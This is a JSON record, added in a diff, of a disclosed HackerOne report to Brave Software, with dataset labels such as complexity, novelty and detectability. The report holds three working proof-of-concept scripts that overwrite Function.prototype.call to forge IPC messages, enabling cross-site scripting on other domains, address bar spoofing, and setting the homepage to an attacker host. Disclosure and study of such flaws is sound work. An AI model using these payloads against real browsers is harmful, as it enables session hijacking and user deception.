@@ -1,0 +1,45 @@
+{
+    "reported_to": "Brave Software",
+    "reported_by": "masatokinugawa ",
+    "title": "Brave Browser unexpectedly allows to send arbitrary IPC messages",
+    "content": "\nSummary:\nI found that Brave Browser allows to overwrite the internal js code from the user js code.\nUsing this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on.\nSteps to Reproduce:\n1 . An attacker overwrites Function.prototype.call, like this:\nCode 196 Bytes\n1Function.prototype.call=function(e){\n2    if(e[0]&&e[0]==\"window-alert\"){\n3        e[0]=\"[ARBITRARY_IPC_MESSAGE_HERE]\";\n4        e[1]=\"[ARBITRARY_IPC_MESSAGE_HERE]\";\n5    }\n6    return this.apply(e);\n7}\n2 . An attacker calls alert().\n3 . Brave's alert() function calls Function.prototype.call in the internal code. At this time, the overwritten Function.prototype.call is used in the alert internal code.\n4 . Function.prototype.call receives IPC messages as arguments. This arguments are replaced to arbitrary messages by step 2's code. Thus, an attacker can send arbitrary IPC messages.\nPoC:\nI'd like to show three PoCs:\nUXSS PoC\n(If it goes well, you can see an alert dialog on google's domain.)\nCode 666 Bytes\n1<script>\n2Function.prototype.call=function(e){\n3    if(e[0]&&e[0]==\"window-alert\"){\n4        e[0]=\"dispatch-action\";\n5        e[1]='{\"actionType\":\"window-new-frame\",\"frameOpts\":{\"location\":\"https://www.google.com/ncr\"},\"openInForeground\":true}'\n6    }\n7    return this.apply(e);\n8}\n9alert();\n10\n11setTimeout(function(){\n12\tfor(var windowKey=0;windowKey<10000;windowKey++){\n13\t\tFunction.prototype.call=function(e){\n14\t\t\tif(e && e[0] && e[0]==\"window-alert\"){\n15\t\t\t\te[0]=\"dispatch-action\";\n16\t\t\t\te[1]=`{\"actionType\":\"window-set-url\",\"location\":\"javascript:alert('document.domain is: '+document.domain)\",\"key\":${windowKey}}`\n17\t\t\t}\n18\t\t\treturn this.apply(e);\n19\t\t}\n20\t\talert();\n21\t}\n22},3000);\n23</script>\nAddress Bar Spoofing PoC\n(If it goes well, you can see https://www.google.com/ in address bar.)\nCode 246 Bytes\n1<script>\n2Function.prototype.call=function(e){\n3\tif(e && e[0] && e[0]==\"window-alert\"){\n4\t\te[0]=\"dispatch-action\";\n5\t\te[1]='{\"actionType\":\"window-set-navbar-input\",\"location\":\"https://www.google.com/\"}';\n6\t}\n7\treturn this.apply(e);\n8}\n9alert();\n10</script>\nChange browser settings PoC\n(If it goes well, your home page is changed to http://attacker.example.com/ . You can see it in about:preferences. )\nCode 281 Bytes\n1<script>\n2Function.prototype.call=function(e){\n3    if(e[0]&&e[0]==\"window-alert\"){\n4        e[0]=\"dispatch-action\";\n5        e[1]='{\"actionType\":\"app-change-setting\",\"key\":\"general.homepage\",\"value\":\"http://attacker.example.com/\"}'\n6    }\n7    return this.apply(e);\n8}\n9alert();\n10</script>\nFYI, Electron has similar issues. I reported it to Electron team and they are working on it.\nCould you confirm this bug?\nThanks!\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": 300,
+    "weaknesses": [
+        "Command Injection - Generic"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1537308900,
+    "report_url": "https://hackerone.com/reports/187542",
+    "is_multi_component": false,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "An attacker overwrites Function.prototype.call to intercept and modify IPC messages"
+        ],
+        [
+            2,
+            "The attacker calls alert(), which triggers the modified Function.prototype.call to send arbitrary IPC messages"
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to overwrite internal JavaScript functions in Brave Browser, specifically Function.prototype.call, to intercept and modify IPC messages. This can lead to UXSS, address bar spoofing, and changing browser settings by sending arbitrary IPC messages.",
+    "reason": "The attack requires understanding of JavaScript prototype manipulation and IPC message handling in Brave Browser. The interaction between overwriting Function.prototype.call and the internal use of this function in alert() is subtle and non-obvious.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "reason": "The vulnerability involves overwriting internal JavaScript functions (Function.prototype.call) to intercept and modify IPC messages within the Brave Browser. This is a client-side JavaScript manipulation issue and does not involve traditional server-side authentication or authorization checks. The proposed methodologies focus on server-side AuthN/AuthZ issues by testing different user sessions and resource IDs, which are not applicable here.",
+        "is_detectable": false
+    }
+}
